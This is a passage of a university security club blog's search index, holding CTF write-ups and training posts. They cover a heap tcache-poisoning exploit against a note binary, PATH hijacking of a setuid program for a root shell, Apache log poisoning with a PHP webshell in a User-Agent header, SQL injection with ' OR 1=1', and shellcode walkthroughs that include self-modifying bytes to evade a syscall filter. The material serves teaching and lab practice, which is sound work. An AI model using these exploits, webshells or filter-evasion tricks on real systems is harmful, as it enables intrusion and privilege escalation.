of some interesting challenges from DownUnder CTF 2022","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"DownUnder CTF was a 48 hour CTF that began on Friday 23rd September 2022. It was the first CTF of the year that ComSec played, we had quite a few new members playing this one so it was a great chance for them to practice their skills. This article contains writeups of a range of difficulty and category, so this should be a good place for new members to see what a jeopardy style CTF looks like. Contents\rContents\rPre-kebab Competition Rage! The Challenge Testing the waters The solution p0ison3d The Challenge Source Code Review Add Note Edit Note Exploitation ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:0:0","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"Pre-kebab Competition I first began searching for the image using Google Lens the image below, is the result of that search: As we can see, the results indicate that the building photographed is called “The Epping Club”. However, the CTF asks us to find “Where” it was taken from. So, we need to do more digging. Once searching “The Epping Club” into google, we are then given the address of the location, which is shown below: To further ensure that this is the correct location, we can see that the small billboard in the photograph appears to read “Rawson”: So, we can be almost certain that it is the correct location. Now that we know the location of the building photographed, we can move onto investigating where it was taken. To do this, we can use google maps to take a look at the surrounding area to figure out a possible location. After further inspection of the image, we know it must have been taken at roof level. This due to the roof of the building being far more present in the image. Whilst in Google Maps (ground level), the roof is less apparent at the same angle, which can be seen below: Knowing this, once we take a look behind us, we are met with a huge clue: The two signs which appear on the roof of the “Epping Hotel” are also present in the original image So we know the flag must be: DUCTF{EppingHotel} ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:1:0","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"Rage! Rage! was a challenge from the “Miscellaneous” category, a category in which challenges are completely random and unprecedented. Anything goes here and it is said that they tend to require a mixture of patience, knowledge and logic to solve. In the end Rage! was only worth 50 points as many teams solved it (420 solves, nice), but it proved to be a fun challenge to tackle no matter the skill level. No prior knowledge is required to be able to follow this writeup. ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:2:0","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"The Challenge The only hint the challenge gives is that you end up with a string, and that string is the flag needed to complete the challenge. Additionally, an audio file titled ‘rage.wav’ is provided for you to download. ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:2:1","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"Testing the waters After downloading and listening to the audio it seemed like a mashup of random nonsense at first, with someone screaming “Rage” at the end. I could hear something was off in the background, but I couldn’t quite pinpoint what was wrong with it. After listening to it a few more times I decided to open it in various audio editing software tools and play around with some settings. I started of with simple edits such as playing in reverse, at x0.5 speed, at x2.0 speed, and a few other settings, you get the idea. Aside from that, a quick google search led me to some ideas of how I could potentially extract a string from an audio file. Some of these ideas included some quick “win” CLI commands (exiftool, strings, etc) to extract strings from the file, analysing the Hexadecimal data for something that may be out of place (like a hidden comment), and even using some python to extract metadata. All valid methods to attempt the challenge, however none of these methods bared any fruit in this case. Finally, I came across a video on YouTube from a user named John Hammond in which he uses Sonic Visualiser to view and analyse contents of the audio file. In the video he generates a spectrogram of the audio and finds the flag hidden in it, as apparently this is a common way in CTFs to hide a flag for these type of challenges, so I gave it a go. ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:2:2","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"The solution Thankfully checking out the file in Sonic Visualiser resulted to be the correct decision, as I could see something in the spectrogram, but I could not make out what it was. As opposed to the video, the flag was not in clear text writing. I decided to play around with a lot of the settings, changing things like zoom, the colour scheme, dbs, frequencies and so many other things that I did not know what exactly they do, in hopes of seeing something that made sense within the spectrogram. After spending a while playing around with it, our teammate ThatGuySteve pointed out it sounded like morse code in the background. Thanks to this it was much easier knowing what I had to look for, and stretching the spectrogram out as well as changing the colour contrast finally revealed the morse code. From there on it was simply a matter of manually typing the morse code into any online decoder to get the flag. The output of the morse code translated to “RAGINGTOWEIRDLIBIDO” which resulted to be the correct flag. Job done! ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:2:3","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"p0ison3d This was a heap based pwn challenge that scored us 428 points. This writeup expects a basic understanding of binary exploitation, and the some foundational knowledge of dynamic memory. ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:3:0","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"The Challenge Three files were available to download. The binary itself, the source code, and a libc file (version 2.27). The presence of the libc file hinted at a heap challenge. When given a specific libc file, it is recommended to patch the binary to use that libc file, and find a linker that is compatible with both. This can be done using patchelf and this useful repository of glibc. The 4 option menu was another big clue that this is a heap challenge. The ability to create, edit, and delete an object on the heap is a classic setup for these types of challenges. ❯ ./p0ison3d ez-notes v0.1 v0.1 only supports up to 3 notes :( [1] add new note [2] read note [3] edit note [4] delete note [5] quit choice: ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:3:1","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"Source Code Review A note structure is defined at the start of the source. A note is made up of an integer, and a pointer to the note data. The integer is used to identify whether the note is allocated. Up to three notes can be exist at a time. typedef struct note { int allocated; char* data; } note_t; note_t storage[3]; Add Note The user can choose the index number for the note, the index is used as the position of the note in the storage array. The user cannot choose the size of chunk that is allocated, 128 bytes are requested, so a 144 byte chunk will be allocated. 128 bytes of data can be written into the chunk, so there is no overflow. void add_note() { int index = get_index(); if (index \u003c 0) { puts(\"error: bad index\"); return; } if (storage[index].allocated) { puts(\"error: index already allocated\"); return; } char* data = (char*)malloc(128); if (!get_data(data, 128)) { puts(\"error: unable to read input\"); return; } storage[index].data = data; storage[index].allocated = 1; } Edit Note The edit note function lets the user select a chunk and write data into it. There is a 25 byte buffer overflow, as the function reads up to 153 bytes of data into the chunk. void edit_note() { int index = get_index(); if (index \u003c 0) { puts(\"error: bad index\"); return; } if (!storage[index].allocated) { puts(\"error: index not allocated\"); return; } if (!get_data(storage[index].data, 153)) { puts(\"error: unable to read input\"); return; } } The delete note function is not interesting, so will be skipped. The two other relevent functions in the source code are quit() and win(). The reason for quit() will become apparent later. void quit() { puts(\"\\ngoodbye!\"); exit(0); } void win() { system(\"cat ./flag.txt\"); } So, to recap. 0x90 sized heap chunks can be allocated, edited, and freed. Up to three chunks can be allocated at a time. There is a heap overflow of 25 bytes when editing a chunk. ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:3:2","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2022-23"],"content":"Exploitation Since this is libc 2.27, the tcache will be used to fulfil all the malloc requests we make. This is useful, as in earlier versions of libc the tcache had few protections. This will let us craft an attack called a tcache dup. The tcache dup is an attack that involved corrupting the heap metadata stored inside a freed chunk to create a fake chunk somewhere else in memory, giving an attacker a write primitive in that area of memory. The attack requires the ability to corrupt heap metadata (such as an overflow or a write primitive) and a location to be overwritten. The binary does not have position independent code, and only partial RelRO. This means the Global Offset Table can be overwritten. This is the final information needed for the attack. The plan is: Allocate three chunks (A, B, C) Free the second and third chunks (C and B). They will be linked into the 0x90 tcache bin. Corrupt chunk B’s metadata to point to the GOT entry for exit(). This essentially links a section of the global offset table into the tcache. Allocate 1 chunk (D), the chunk will occupy the same space as the freed chunk C, as chunk C is the first entry in the 0x90 tcache bin. A second chunk (E), the second chunk, rather than being allocated inside the heap, will be allocated over the GOT entry for exit. Writing data into chunk E will overwrite the GOT entry for exit, and redirect the program to the win function. Let’s write some code! I already wrote some helper functions to make the main exploit more readable, as they take up a lot of space I’ve left them out until the final exploit at the end, so if you’re following along go get them! First three chunks should be allocated, this can be done using the create_note() function. with conn() as p: chunk_A = create_note(b\"A\" * 120) chunk_B = create_note(b\"B\" * 120) chunk_C = create_note(b\"B\" * 120) Next, delete note C and then note B. This can be done using the delete_note() function. delete_note(chunk_C) delete_note(chunk_B) The 0x90 tcache bin is now populated with the two chunks. The annotation on the right confirms that chunk C is the first entry in the tcache bin. Next, the metadata of chunk B needs to be corrupted. Since we are overwriting from chunk A, we need to keep the chunk B size field the same, so we can overwrite it with itself. The following 8 bytes are the used as the tcachebins forward pointer, so this should be overwritten with the address of exit in the global offset table. edit_note(chunk_A, b\"C\" * (152 - 8 - 8) + pack(0x91) + pack(elf.got.exit)) As we can see, exit.got has been linked into the tcache bin’s singly linked list. Upon allocating two more chunks, the second will be the fake chunk in the GOT. index = 1 chunk_D = create_note(b\"D\") chunk_E = create_note(pack(elf.sym.win)) Exit has been overwritten with the address of the win() function. The program will now call win() when it exits. That’s all that is needed! The flag is ours. The final exploit is below. #!/usr/bin/env python3 from pwn import * elf = ELF(\"./p0ison3d_patched\", checksec=False) context.binary = elf context.terminal = \"kitty\" gs = ''' continue ''' #context.log_level = \"debug\" r = remote(\"2022.ductf.dev\", 30024) def create_note(data): global index if len(data) \u003e 128: print(\"Data cannot be \u003e 128 when allocating a chunk\") exit() p.sendlineafter(b\":\\n\", b\"1\") p.sendlineafter(b\"index:\\n\", str(index).encode()) p.sendlineafter(b\"data:\\n\", data) index += 1 return index - 1 def read_note(index): p.sendlineafter(b\":\\n\", b\"2\") p.sendlineafter(b\"index:\\n\", str(index).encode()) p.recvuntil(\"data:\\n\") data = p.clean(1) return data def edit_note(index, data): if len(data) \u003e 152: print(\"Data cannot be \u003e 152 when allocating a chunk\") exit() p.sendlineafter(b\":\\n\", b\"3\") p.sendlineafter(b\"index:\\n\", str(index).encode()) p.sendlineafter(b\"data:\\n\", data) def delete_note(index): p.sendlineafter(b\":\\n\", b\"4\") p.sendlineafter(b\"index:\\n\", str(index).encode()) index = 0 with conn() as p: chunk_A = create_note(b\"A\" * 120) chunk_B ","date":"2022-08-10","objectID":"/posts/down-under-ctf-2022/:3:3","tags":["downunderctf","ctf","writeup"],"title":"DownUnder CTF 2022","uri":"/posts/down-under-ctf-2022/"},{"categories":["Academic Year 2021-22"],"content":"Writeup of the session dedicated to log and PATH poisoning","date":"2022-04-13","objectID":"/posts/2022_log_and_path_poisoning/","tags":["web","privesc","logs","cron"],"title":"Log and PATH Poisoning","uri":"/posts/2022_log_and_path_poisoning/"},{"categories":["Academic Year 2021-22"],"content":"In this session we talked about log files, the PATH variable and how an attacker could exploit them. Briefly, the PATH is a system variable unique to UNIX systems which defines the hierarchy that the CPU uses to find executable binaries. If someone were to prepend or append a valid directory to the PATH, then the CPU would consider it as a valid location to find binaries in. Similarly, log files can be used as a vector for code execution if the permissions were to be misconfigured. Presentation slides can be found here. ","date":"2022-04-13","objectID":"/posts/2022_log_and_path_poisoning/:0:0","tags":["web","privesc","logs","cron"],"title":"Log and PATH Poisoning","uri":"/posts/2022_log_and_path_poisoning/"},{"categories":["Academic Year 2021-22"],"content":"Demo 1: PATH poisoning As I said before, the PATH is an environmental variable that tells the shell where to locate executable binaries. Using ’echo’ it’s possible to print the PATH to screen and using ’export’ it’s possible to prepend or append valid directories. PATH checks the directories in order, from left to right, so if a directory is prepended to the PATH, it would be parsed and checked before any other directory; making it a perfect place to store malicious payloads. The demo starts with a box that gives us instruction on how to connect and an username to connect as. Using the command ssh -p 1337 comsec@\u003cip\u003e and the password given, we can login as user comsec and we discover that an executable file is present We also see two ther files, a C file that is presumably the source code for our executable and a text file. By opening the C file we gain an understanding of what it does. We found our vulnerability! The script executes a command, as root, without specifiying the absolute path of the binary used (cat in our case). This is easily exploitable by creating a file called ‘cat’ which content is ‘/bin/sh’ so that when called, it will drop us a shell. Also, we need to prepend the folder to the PATH so that our evil version of ‘cat’ is executed before the real ‘cat’. Now, the only thing left to do is execute ‘poison’ once again and get our root shell to drop. ","date":"2022-04-13","objectID":"/posts/2022_log_and_path_poisoning/:1:0","tags":["web","privesc","logs","cron"],"title":"Log and PATH Poisoning","uri":"/posts/2022_log_and_path_poisoning/"},{"categories":["Academic Year 2021-22"],"content":"Demo 2: Log poisoning Log poisoning, unlike PATH poisoning, can work with web applications as well as locally. The most basic example of log poisoning is apache log poisoning, where an attacker exploits either ‘access.log’ or ’error.log’ in order to write custom payloads which allow to gain code execution. The demo uses ‘access.log’ to demonstrate how log poisoning works. The first thing we see after navigating to the target web page is a portal that allows the user to select a different kind of snake and read very interesting facts about them. As we try to read facts about a different snake, we can notice that the URL changed as well. This is easily recognizable as an LFI vulnerability which can be used to read any file that the webapp (aka www-data) has access to. We can use it to try to read apache log files. Yes! Now that we managed to actually read the file all there’s left is to actually poison this logfile but, how do we do it? Well, given the nature of the logfile, access.log will record any connection attempt made, as well as the header of the request, even the connection (for example) to non-existant pages. Since the target runs a PHP application, we can submit a request with a simple webshell in the header, then connect to access.log and specify our command as a URL parameter. The following script is the one used to forge and send the malicious request. import requests URL = \"http://172.17.0.2:80/evil\" ua = {\"User-Agent\": \"\u003cp\u003e\u003c?php system($_GET['p']);?\u003e\u003c/p\u003e\"} r = requests.get(URL, headers=ua) Now, if we exploit the LFI vulnarbility in order to read access.log, we can see that it gives us a ‘Fatal Error’ since the argument ‘p’ is not present. This is the indicator that our script worked. At this point, we can insert our payload in the URL and refresh the page in order to see that we got code execution! The only thing left is to find the flag and read it. In order to do this we use ‘find’ and ‘cat’. ","date":"2022-04-13","objectID":"/posts/2022_log_and_path_poisoning/:2:0","tags":["web","privesc","logs","cron"],"title":"Log and PATH Poisoning","uri":"/posts/2022_log_and_path_poisoning/"},{"categories":["Academic Year 2021-22"],"content":"Conclusion We hope this session interested you, even though this may be pretty simple and seemingly basic concepts, log poisoning is not rare and path poisoning is interesting if paired with cronjobs. On CTFd there are also a couple of challenges for you to try! ","date":"2022-04-13","objectID":"/posts/2022_log_and_path_poisoning/:3:0","tags":["web","privesc","logs","cron"],"title":"Log and PATH Poisoning","uri":"/posts/2022_log_and_path_poisoning/"},{"categories":["Academic Year 2021-22"],"content":"An introductory session into SQL Injection","date":"2022-03-02","objectID":"/posts/2021_sqli/","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"SQL Injection Further on today, we will be using THM If you haven’t registered go to tryhackme.com Ensure you have the VPN file or AttackBox ready ","date":"2022-03-02","objectID":"/posts/2021_sqli/:0:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"SQL Structured Query Language (SQL) is used to communicate with databases and has the capability to delete, edit, insert or retrieve data. There are a few variations of SQL which have some slight syntactical differences. A few examples are MySQL, SQL Server and SQLite. Question Can you think where databases are used on the web? ","date":"2022-03-02","objectID":"/posts/2021_sqli/:1:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"SQL Example What will this do? SELECT * FROM Customers WHERE Firstname=\"Jack\"; Answer It will search the table customers and will return all the people with the first name “Jack”. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:2:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"Injection Attacks An injection attack is where a user can trick a server to run a command, via vectors such as an input, header or URL. It is currently in the third position of the OWASP Top 10. The main cause of an injection attack is down to improper user input sanitisation and or validation. Note This does not only include SQL injection, other forms include: - XSS - OS Command Injection ","date":"2022-03-02","objectID":"/posts/2021_sqli/:3:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"SQL Injections SQL injection, sometimes shortened to SQLi, is where you are able to insert commands that are able to effect or retrieve information from databases. It is regularly found on dynamic sites; with WordPress plugins being frequently affected (see CVE-2022-25607 for an example). Info Akamai observed, between 2017-2019, 65.1% of attacks on web applications used SQLi. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:4:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"A Bad Demo Can you spot/exploit the flaw? user=input(\"Enter Username: \") password=input(\"Enter Password: \") sql = 'SELECT * FROM users WHERE user==\"'+user+'\"AND password==\"'+password+'\";' print(\"SQL Command Sent: \", sql, \"\\n\") cursor.execute(sql) user=cursor.fetchall() How To \" OR 1=1; – 'SELECT * FROM users WHERE user==\"'+user+'\"AND password==\"'+ password+'\";' Becomes: SELECT * FROM user WHERE user==\"Jack\" AND password==\"\" OR 1=1; --\"; The command ends the string then compares 1 with 1 (which equals true) and “–” comments out the rest of the statement. In this case, the whole table would be printed. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:5:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"Can you secure it? Research ways that you can secure the program and implement it. How To Input validation Use ? placeholder Use the fetchone method - this does not secure it, but makes exploitation much easier ","date":"2022-03-02","objectID":"/posts/2021_sqli/:6:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"How am I meant to remember the commands? Thankfully you can use a tool named SQLmap, here is a useful SQLmap Cheatsheet. It is also possible to pair with Burpsuite, to save having specify location. To do this, intercept the request, then save it to a file and use the following command: sqlmap -r filename ","date":"2022-03-02","objectID":"/posts/2021_sqli/:7:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"If it is that easy… If it is that easy, why is it so common? Well, many applications are written in PHP which didn’t originally contain a SQL validation method. This has meant that many have ignored it. The main problem now is that many insecure code examples exist on code forums/sites. Another factor is the use of content management systems. This is because if the underlying system is affected, every website using that platform will be vulnerable. However, this can be a benefit, as it will mean that the code only needs to be updated in one place. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:8:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"More Advanced SQLi Time-based/Blind - Sometimes you cannot see the output, therefore, you can use timers to show your answer. Boolean - It is possible to infer the content inside a database using boolean operators, such as changing the order the way data is displayed to the user based depending on whether a comparison is true. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:9:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"NoSQL, no problem? Some people believe that no-SQL is injection free, but this is false. NoSQL stands for non-relational SQL. Although the syntax is different it is still exploitable. Cheat Sheet. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:10:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"Prevent SQLi Switch to a static site, like Hugo. but you lose some functionality (e.g. forms). Not as beginner friendly. If you use a CMS, install the bare-minimum of plugins (and only ones from trusted sources). Pentest the site! ","date":"2022-03-02","objectID":"/posts/2021_sqli/:11:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"Today’s Task Use THM search function and complete: sqlilab sqlinjectionlm dailybugle (organised in terms of difficulty) ask below if you have any questions. ","date":"2022-03-02","objectID":"/posts/2021_sqli/:12:0","tags":["SQLi","TryHackMe","OWASP","web"],"title":"SQL Injection","uri":"/posts/2021_sqli/"},{"categories":["Academic Year 2021-22"],"content":"The annual Coventry ComSec Christmas CTF Challenge","date":"2021-12-14","objectID":"/posts/2021_twelvetide/","tags":["ctf"],"title":"Twelvetide CTF","uri":"/posts/2021_twelvetide/"},{"categories":["Academic Year 2021-22"],"content":"Hi everyone, Hope you’re all enjoying yourselves now that coursework deadlines have passed. As Christmas approaches ComSec would like to announce the dates of our Christmas CTF - Twelvetide. The CTF will last 15 days, with new challenges released every day for the first 12 days. Difficulty will range from entry-level to intermediate, so make sure you sign on and give it a go! More details will be released on the ComSec discord in coming days. If you are not a member, check our post on Aula, or search for ComSec in your university email contacts. Merry Christmas Ben, Jack \u0026 Tiago (ComSec) ","date":"2021-12-14","objectID":"/posts/2021_twelvetide/:0:0","tags":["ctf"],"title":"Twelvetide CTF","uri":"/posts/2021_twelvetide/"},{"categories":["Academic Year 2021-22"],"content":"A walkthrough of the shellcoding challenges on CTFd","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"As promised by Ben in Assembly \u0026 Shellcoding, this article will cover the solutions for the Shellcode challenges. The challenges can be found on CTFd and is strongly recommended to try to solve the challenges on your own before continue reading this article! ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:0:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Preparation for the challenges Each of the following challenges will require you to send your already assembled code to the target; whose ip address and port is specified in the description of each challenge on CTFd. The file ‘boilerplate.py’ was kindly provided and its purpose is to help assemble your code, connect to the host and inject the payload; all you have to do it insert your assembly code where required and type the ip address and port number of the target inside the brackets of the p.remote() method. i.e. p.remote(\"0.cloud.chals.io\", 0000) ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:1:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Solution: Shellcode Challenge 1 By navigating to the target a webpage presents itself which contains some information, the only one we need right now is: There are no protections on this level. Just read the flag at ‘/flag’. We now know that the flag is placed in a file called “flag” in the root directory of the target. .global _start .intel_syntax noprefix _start: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall The purpose of this first code is to use sys.open() to grab the file descriptor of our flag. A file descriptor is an unique identifier of a file and is usually a non negative integer. The first three file descriptors are reserved in this order: File descriptor 0: stdin File descriptor 1: stdout File descriptor 2: stderr The previous code loads the path of the flag, specified in a label at the end of the file, in rdi; the two xor instruction set the values of rsi and rdx to 0. Then the value 2 is moved in rax and syscall is executed. The first operation is made in order to set the argument for sys.open() since it needs the path of the file which the FD is going to get stored. Generally, all the values moved in registers before a syscall have the purpose to initialize the arguments for the syscall itself, apart from rax which must contain the value which specify which syscall to execute and will usually store the return value of the syscall. To give a better understanding of the syscall keyword, we can represent it like this: syscall(rax, rdi, rsi, rdx, …) where the arguments are values stored in the registers and have a strict order that can be found here. mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall Now we use sys.sendfile() to print our flag in the terminal. We use sendfile because it allows two file descriptors as arguments, one in input and the other in output; a better representation of sys.sendfile is sys.sendfile(output_fd, input_fd, offset, size) where the offset indicates where to start sending information and the size is the number of bytes that will be sent. As we can see we are sending to stdout (file descriptor 1) the contents of the flag file that we opened before (remember that, in this case, the rax contains the file descriptor for the flag file) starting from byte 0 (start of file) and will be sent 60 bytes (rough estimate, if needed this value can be increased). flag: .string \"flag\" This last part is the label that we called in the first instruction. This label contains the string “flag” which represents the path to our flag file. With this part clarified we can actually understand that, in order to store this string in rdi, we must load the memory address of this label which contains the string (hence why we used lea, which stands for load effective address, instead of mov). We then type our newly finished shellcode into boilerplate.py and press enter we notice that we recieve different text compared with the first attempt (attempted with an empty payload). The target answers our code with a report of the assembly code that will be executed. from pwn import * context.arch = \"amd64\" #context.log_level = debug def print_clean(data): data = data.split(b\"\\n\") for i in data: print(i.decode(\"latin-1\")) # shellcode goes here shellcode = asm(f\"\"\" .global _start .intel_syntax noprefix _start: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall flag: .string \"flag\" \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x1000 bytes from stdin.\\n\")) p.sendline(shellcode) print_clean(p.readrepeat()) Here’s the solution already implemented in ‘boilerplate.py’ ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:2:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Solution: Shellcode Challenge 2 First thing we do is, like the previous challenge, edit the boilerplate file with the new port and navigate to the target and observing the webpage, we can see that the flag is in the same location but that “This challenge reads in much fewer bytes.” and this statement is reinforced by another line that states the following: “Reading 0x18 bytes from stdin.”. This means that only 24 bytes (0x18 = 24) worth of instructions will be read from standard input, this means that our previous shellcode won’t work anymore since the target will only allow execute the first 24 bytes worth of information. In order to overcome this issue we create a multi stage shellcode, this type of shellcode consists in sending multiple shellcodes during the same connection; in this case we will use a two staged attack. .intel_syntax noprefix .global _start _start: push 0 push 0 pop rdi lea rsi, [rip+9] mov rdx, 250 pop rax syscall This code will allow us to use sys.read() in order to receive instruction from stdin, effectively bypassing the 24 bytes restriction imposed by the challenge. sys.read() requires three arguments: a file descriptor, a buffer and a size value. Being 0 the file descriptor for stdin and the value needed to invoke the syscall, we push two zeros on the stack. We load the memory address which will point to the end of our shellcode in rsi and specify 250 expected bytes. We then invoke the kernel to execute sys.read(). .global _start .intel_syntax noprefix _start: open: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall sendfile: mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall exit: mov rax, 60 mov rsi, 42 syscall flag: .string \"flag\" The second shellcode is the same shellcode used in challenge 1. shellcode1 = asm(f\"\"\" # stage 1 shellcode goes here \"\"\") shellcode2 = asm(f\"\"\" # stage 2 shellcode goes here \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x18 bytes from stdin.\\n\")) p.sendline(shellcode1) pause(1) p.send(shellcode2) print_clean(p.readrepeat()) In order to successfully execute a multi-stage shellcode we also need to modify the boilerplate.py file since the two scripts must be in different payloads. As shown above, we create another variable in which we type our stage 1 shellcode and we send it through before the actual payload containing the stage 2 shellcode; between the two payloads we want to wait 1 second for the stage 1 shellcode to execute so we add “pause(1)”. from pwn import * context.arch = \"amd64\" #context.log_level = debug def print_clean(data): data = data.split(b\"\\n\") for i in data: print(i.decode(\"latin-1\")) # shellcode goes here setup = asm(f\"\"\" .intel_syntax noprefix .global _start _start: main: push 0 push 0 pop rdi lea rsi, [rip+10] mov rdx, 250 pop rax syscall \"\"\") shellcode = asm(f\"\"\" .global _start .intel_syntax noprefix _start: open: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 syscall sendfile: mov rdi, 1 mov rsi, rax mov rdx, 0 mov r10, 60 mov rax, 40 syscall exit: mov rax, 60 mov rsi, 42 syscall flag: .string \"flag\" \"\"\") p = remote(\"0.cloud.chals.io\", 0000) print_clean(p.recvuntil(b\"Reading 0x18 bytes from stdin.\\n\")) p.sendline(setup) pause(1) p.send(shellcode) print_clean(p.readrepeat()) Here’s the solution already implemented in ‘boilerplate.py’ ","date":"2021-11-07","objectID":"/posts/2021_assembly_and_shellcoding_walkthrough/:3:0","tags":["pwn","assembly","shellcode","ctf"],"title":"Walkthrough: Shellcoding Challenges","uri":"/posts/2021_assembly_and_shellcoding_walkthrough/"},{"categories":["Academic Year 2021-22"],"content":"Solution: Shellcode Challenge 3 Same procedure used with the first two challenges, we edit the port value in ‘boilerplate.py’ and navigate to the target webpage. This time we notice that the stdin bytes are back to 0x1000 but there is new text that states that now syscalls in all their forms are filtered out before, and only before, runtime. The filter only looks for the specific bytes of syscall (0x0f05), sysenter(0x0f34) and int (0x80). There are also other lines which contiain helpful hints to solve this challenge. The answer of this challenge lies in how syscalls are actually executed. I we look at the output of the previous challenge: We notice that “syscall” is nothing more than two bytes (0x0f and 0x05) loaded one after the other. This is confirmed by the fact that if we substitute “syscall” with “.byte 0x0f, 0x05” in the previous challenge, we will obtain the same results. inc byte ptr [rip+evil+1] inc byte ptr [rip+evil] evil: .byte 0x0e .byte 0x04 The previous code is an effective substitute of syscall: it creates a label called “evil” which contains two bytes, 0x0e and 0x04. Before this label is actually run we increase by 1 the values of 0x0e and 0x04 which will now be 0x0f and 0x05. By doing this we have bypassed the filtered imposed by the challenge by creating a self-modifying shellcode. from pwn import * context.arch = \"amd64\" #context.log_level = debug def print_clean(data): data = data.split(b\"\\n\") for i in data: print(i.decode(\"latin-1\")) # shellcode goes here shellcode = asm(f\"\"\" .global _start .intel_syntax noprefix _start: lea rdi, [rip+flag] xor rsi, rsi xor rdx, rdx mov rax, 2 inc byte 